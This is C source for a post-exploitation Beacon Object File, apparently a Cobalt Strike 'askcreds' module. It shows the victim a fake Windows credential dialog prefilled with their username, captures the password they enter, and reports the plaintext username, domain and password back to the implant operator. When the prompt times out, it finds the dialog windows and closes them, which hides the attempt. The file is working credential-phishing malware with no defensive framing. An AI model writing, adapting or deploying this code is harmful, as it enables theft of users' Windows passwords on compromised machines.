#define SECURITY_WIN32

#include <windows.h>
#include <wincred.h>
#include <security.h>

#include "askcreds.h"
#include "../_include/beacon.h"

#define MAX_NAME 8192

typedef struct _THREAD_PARAMS {
	LPWSTR lpwReason;
	LPWSTR lpwMessage;
} THREAD_PARAMS, *PTHREAD_PARAMS;

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
	PCHAR pWindowTitle = NULL;
	LPWSTR pExeName = NULL;
	DWORD dwProcId = 0; 

	if (!hWnd)
		return TRUE;

	if (!USER32$IsWindowVisible(hWnd))
		return TRUE;

#if defined(WOW64)
	LONG_PTR lStyle = USER32$GetWindowLongA(hWnd, GWL_STYLE);
#else
	LONG_PTR lStyle = USER32$GetWindowLongPtrA(hWnd, GWL_STYLE);
#endif
	if (!USER32$GetWindowThreadProcessId(hWnd, &dwProcId))
		return TRUE;

	pWindowTitle = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_NAME);
	if (pWindowTitle == NULL)
		goto CleanUp;

	if (!USER32$SendMessageA(hWnd, WM_GETTEXT, MAX_NAME, (LPARAM)pWindowTitle))
		goto CleanUp;

	if (MSVCRT$_stricmp(pWindowTitle, "Windows Security") == 0) {
		USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
	}
	else if ((dwProcId == KERNEL32$GetCurrentProcessId()) && (WS_POPUPWINDOW == (lStyle & WS_POPUPWINDOW))){
		USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
	}
	else{
		DWORD dwSize = MAX_PATH;
		HANDLE hProcess = NULL;

		hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcId);
		if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE){
			pExeName = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
			if (pExeName == NULL) {
				goto CleanUp;
			}

			if (KERNEL32$QueryFullProcessImageNameW(hProcess, 0, pExeName, &dwSize)) {
				if (SHLWAPI$StrStrIW(pExeName, L"CredentialUIBroker.exe")) {
					USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
				}
			}
		}

		if (hProcess)
			KERNEL32$CloseHandle(hProcess);
	}

CleanUp:

	if (pWindowTitle)
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pWindowTitle);

	if (pExeName)
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pExeName);

	return TRUE;
}

DWORD WINAPI AskCreds(_In_ PTHREAD_PARAMS params) {
	DWORD dwRet = 0;
	HWND hWnd;
	CREDUI_INFOW credUiInfo;
	credUiInfo.pszCaptionText = params->lpwReason;
	credUiInfo.pszMessageText = (LPCWSTR) params->lpwMessage;
	credUiInfo.cbSize = sizeof(credUiInfo);
	credUiInfo.hbmBanner = NULL;
	credUiInfo.hwndParent = NULL;

	DWORD authPackage = 0;
	LPWSTR szUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
	LPWSTR lpwPasswd = L"";
	LPVOID inCredBuffer = NULL;
	LPVOID outCredBuffer = NULL;
	ULONG inCredSize = 0;
	ULONG outCredSize = 0;
	BOOL bSave = FALSE;

	ULONG nSize = 257;
	if (SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
		if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, (LPWSTR)szUsername, lpwPasswd, 0, &inCredSize) && KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
			inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
			if (inCredBuffer != NULL) {
				if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, (LPWSTR)szUsername, lpwPasswd, inCredBuffer, &inCredSize)) {
					KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
					inCredBuffer = NULL;
					inCredSize = 0;
				}
			}
		}
	}
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szUsername);

	hWnd = USER32$GetForegroundWindow();
	if (hWnd != NULL) {
		credUiInfo.hwndParent = hWnd;
	}

	dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
		&credUiInfo, 0,
		&authPackage,
		inCredBuffer,
		inCredSize,
		&outCredBuffer,
		&outCredSize,
		&bSave,
		CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
		);

	if (dwRet == ERROR_SUCCESS) {
		LPWSTR szUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
		LPWSTR szPasswd = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
		LPWSTR szDomain = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
		DWORD maxLenName = 514;
		DWORD maxLenPassword = 514;
		DWORD maxLenDomain = 514;

		if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, szPasswd, &maxLenPassword)) {
			if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
				BeaconPrintf(CALLBACK_OUTPUT,
					"[+] Username: %ls\n"
					"[+] Password: %ls\n", szUsername, szPasswd);

			}
			else {
				BeaconPrintf(CALLBACK_OUTPUT,
					"[+] Username: %ls\n"
					"[+] Domainname: %ls\n"
					"[+] Password: %ls\n", szUsername, szDomain, szPasswd);
			}
		}
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szUsername);
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szPasswd);
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szDomain);
	}
	else if (dwRet == ERROR_CANCELLED) {
		BeaconPrintf(CALLBACK_ERROR, "The operation was canceled by the user\n");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "CredUIPromptForWindowsCredentialsW failed, error: %d\n", dwRet);
	}

	if (inCredBuffer)
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);

	return dwRet;
}

VOID go(IN PCHAR Args, IN ULONG Length) {
	THREAD_PARAMS params;

	datap parser;
	BeaconDataParse(&parser, Args, Length);	
	params.lpwReason  = (WCHAR*)BeaconDataExtract(&parser, NULL);
	params.lpwMessage = (WCHAR*)BeaconDataExtract(&parser, NULL);
    DWORD dwTimeOut = BeaconDataInt(&parser) * 1000;

	DWORD ThreadId = 0;
	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)&params, 0, &ThreadId);
	if (hThread == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to create thread.\n");
		return;
	}

	DWORD dwResult = KERNEL32$WaitForSingleObject(hThread, dwTimeOut);
	if (dwResult == WAIT_TIMEOUT) {  
		BeaconPrintf(CALLBACK_ERROR, "ThreadId: %d timed out, closing Window.\n", ThreadId);
		if (!USER32$EnumWindows(EnumWindowsProc, (LPARAM)NULL)) { // Cancel operation by closing Window.
			KERNEL32$TerminateThread(hThread, 0); // Only if WM_CLOSE failed, very dirty..
			return;
		}
		KERNEL32$WaitForSingleObject(hThread, 2000);
	}

	if (hThread)
		KERNEL32$CloseHandle(hThread);

	return;
}
